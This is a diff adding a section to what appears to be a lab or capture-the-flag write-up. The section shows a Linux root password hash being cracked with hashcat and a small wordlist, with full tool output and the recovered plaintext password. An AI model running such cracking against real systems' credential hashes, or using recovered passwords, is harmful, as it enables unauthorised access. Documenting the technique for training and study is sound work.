@@ -217,3 +217,41 @@ xrdp:x:131:136::/run/xrdp:/usr/sbin/nologin
 ```
 
 There aren't any human users, but there are some services.
+
+### Cracking `root` Password
+```
+ $ echo -n '$6$19yJir3t$DKemu8nRjxvuPbDZdZcdtsJiiVd7zAXN7Q63.eepYT.R0LqsDMYCzwetEO58sPROWiVfhY1Aeu3O3awr57fv50' > crackme
+ $ hashcat -O crackme /usr/share/wordlists/fasttrack.txt
+...
+
+Dictionary cache built:
+* Filename..: /usr/share/wordlists/fasttrack.txt
+* Passwords.: 262
+* Bytes.....: 2430
+* Keyspace..: 262
+* Runtime...: 0 secs
+
+$6$19yJir3t$DKemu8nRjxvuPbDZdZcdtsJiiVd7zAXN7Q63.eepYT.R0LqsDMYCzwetEO58sPROWiVfhY1Aeu3O3awr57fv50:P@55w0rd!
+
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 1800 (sha512crypt $6$, SHA512 (Unix))
+Hash.Target......: $6$19yJir3t$DKemu8nRjxvuPbDZdZcdtsJiiVd7zAXN7Q63.ee...57fv50
+Time.Started.....: Thu May 30 17:22:55 2024 (0 secs)
+Time.Estimated...: Thu May 30 17:22:55 2024 (0 secs)
+Kernel.Feature...: Optimized Kernel
+Guess.Base.......: File (/usr/share/wordlists/fasttrack.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:      944 H/s (3.07ms) @ Accel:256 Loops:64 Thr:1 Vec:8
+Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
+Progress.........: 256/262 (97.71%)
+Rejected.........: 0/256 (0.00%)
+Restore.Point....: 0/262 (0.00%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:4992-5000
+Candidate.Engine.: Device Generator
+Candidates.#1....: Spring2017 -> monkey
+Hardware.Mon.#1..: Util: 35%
+
+Started: Thu May 30 17:22:53 2024
+Stopped: Thu May 30 17:22:57 2024
+```
